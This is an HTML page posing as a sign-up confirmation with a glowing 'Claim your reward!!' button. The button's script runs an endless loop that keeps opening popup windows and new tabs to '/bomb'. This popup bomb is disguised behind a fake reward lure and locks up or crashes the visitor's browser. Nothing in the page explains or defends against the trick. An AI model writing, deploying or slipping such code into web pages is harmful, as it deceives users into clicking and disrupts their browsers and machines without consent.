<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Not a bomb</title>
    <style>
        :root {
            --secondary-color: #FFFFFF;
            --primary-color: #F5F8FC;
            --primary-accent-color: #1966D2;
            --primary-text-color: #000000;
            --secondary-text-color: #5F6367;
            --secondary-accent-color: #FABE1C;
            --primary-danger-color: #FA3232;
            --button-background: #1966D2;
            --button-fill: #FABE1C;
        }

        body {
            background: #161616;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        * {
            box-sizing: border-box;
            font-family: 'Poppins', 'Roboto', 'greycliff-cf', sans-serif;
            font-weight: 400;
            font-style: normal;
        }

        .gradient-text {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ce79);
            background-size: 400%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 5s ease infinite;
        }

        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .white-text {
            color: white;
        }

        h1 {
            font-size: 2.5em;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-bottom: 10px;
        }

        .dc {
            height: 50px;
            color: rgb(255, 255, 255);
            cursor: pointer;
            position: relative;
            z-index: 0;
            font-family: 'greycliff-cf', 'Poppins', 'Roboto', sans-serif;
            font-weight: 900;
            border: none;
            outline: none;
            background: var(--button-background);
            border-radius: 10px;
            color: var(--primary-color);
            min-width: 200px;
            padding: 0.75rem;
            background-color: #3b82f6;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .dc::before {
            content: "";
            position: absolute;
            top: -2px;
            left: -2px;
            z-index: -1;
            filter: blur(5px);
            width: calc(100% + 8px);
            height: calc(100% + 4px);
            opacity: 0;
            background: linear-gradient(45deg, 
                rgb(255, 0, 0), 
                rgb(255, 115, 0), 
                rgb(255, 251, 0), 
                rgb(72, 255, 0), 
                rgb(0, 255, 213), 
                rgb(0, 43, 255), 
                rgb(122, 0, 255), 
                rgb(255, 0, 200), 
                rgb(255, 0, 0)) 0% 0% / 400%;
            animation: glowing 20s linear infinite;
            transition: opacity 0.3s ease-in-out;
            border-radius: 10px;
        }

        .dc::after {
            z-index: -1;
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: #3b82f6;
            left: 0;
            top: 0;
            border-radius: 10px;
        }

        .dc:hover::before {
            opacity: 1;
        }

        @keyframes glowing {
            0% { background-position: 0% 0%; }
            100% { background-position: 400% 0%; }
        }
    </style>
</head>
<body>
    <h1>
        <span class="gradient-text">Thanks</span> 
        <span class="white-text">For Signing Up</span>
    </h1>
    <button class="dc" type="button" onclick="defunction()">Claim your reward!!</button>
    <script>
        function defunction(){
            while (true) {
                window.open('/bomb', 'popup', "height=200,width=200");
                window.open('/bomb', '_blank');
            }
        }
    </script>
</body>
</html>
